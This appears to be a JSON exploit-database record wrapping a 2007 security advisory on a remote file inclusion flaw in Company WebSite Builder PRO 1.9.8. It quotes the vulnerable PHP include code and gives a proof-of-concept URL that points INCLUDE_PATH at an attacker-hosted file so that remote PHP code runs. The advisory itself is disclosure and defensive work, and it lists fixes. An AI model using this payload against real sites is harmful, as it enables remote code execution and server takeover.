{
  "id": "3485",
  "title": "Company WebSite Builder PRO 1.9.8 - &#039;INCLUDE_PATH&#039; Remote File Inclusion",
  "cve": "CVE-2007-1513",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n       \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_76$2007\r\n\r\n--------------------------------------------------------------------------------------------\r\n[ECHO_ADV_76$2007] Company WebSite Builder PRO (INCLUDE_PATH) Remote File Inclusion Vulnerability\r\n--------------------------------------------- ----------------------------------------------\r\n\r\nAuthor          : Dedi Dwianto a.k.a the_day\r\nDate Found      : March, 15th 2007\r\nLocation        : Indonesia, Jakarta\r\nweb             : http://advisories.echo.or.id/adv/adv76-theday-2007.txt\r\nCritical Lvl    : Highly critical\r\nImpact          : System access\r\nWhere           : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication     : Company WebSite Builder PRO ( CWB )\r\nversion         : 1.9.8\r\nURL             : http://www.grafxsoftware.com/\r\n\r\nThis software makes it easy to build an e-commerce site that processes credit cards,\r\nwire transfers. This is a great Content Management System that's easy to install and use WITHOUT having\r\nto FTP upload pages every time they need to be updated.\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~\r\n\r\n- Invalid include function at comanda.php\r\n-----------------------comanda.php------------\r\n\r\n<?\r\n...\r\ninclude($INCLUDE_LANGUAGE_PATH.\"$LANG.inc.php\");\r\ninclude($INCLUDE_PATH.\"connection.php\");\r\ninclude_once($INCLUDE_PATH.\"connection.php\");\r\ninclude_once($INCLUDE_PATH.\"cls_produs.php\");\r\ninclude_once($INCLUDE_PATH.\"cls_left_menu.php\");\r\ninclude_once($INCLUDE_PATH.\"cls_stire.php\");\r\ninclude_once($INCLUDE_PATH.\"cls_orders.php\");\r\ninclude_once($INCLUDE_PATH.\"cls_headline_prod.php\");\r\ninclude_once($INCLUDE_PATH.\"cls_checkout.php\");\r\ninclude_once(\"cls_download_products.php\");\r\n....\r\n?>\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"$INCLUDE_PATH\" parameter in comanda.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\n\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~\r\n\r\nhttp://localhost/cwb/comanda.php?INCLUDE_PATH=http://atacker.com/inject.txt?\r\n\r\n\r\nSolution:\r\n~~\r\n\r\n- Sanitize variable $INCLUDE_PATH affected files.\r\n- Turn off register_globals\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~\r\n~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous\r\n~ Jessy Nice Girl\r\n~ az001,bomm_3x,matdhule\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel - #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~\r\n    EcHo Research & Development Center\r\n    http://advisories.echo.or.id\r\n    erdc[at]echo[dot]or[dot]id\r\n    the_day[at]echo[dot]or[dot]id\r\n\r\n# milw0rm.com [2007-03-15]",
  "url": "https://www.exploit-db.com/exploits/3485"
}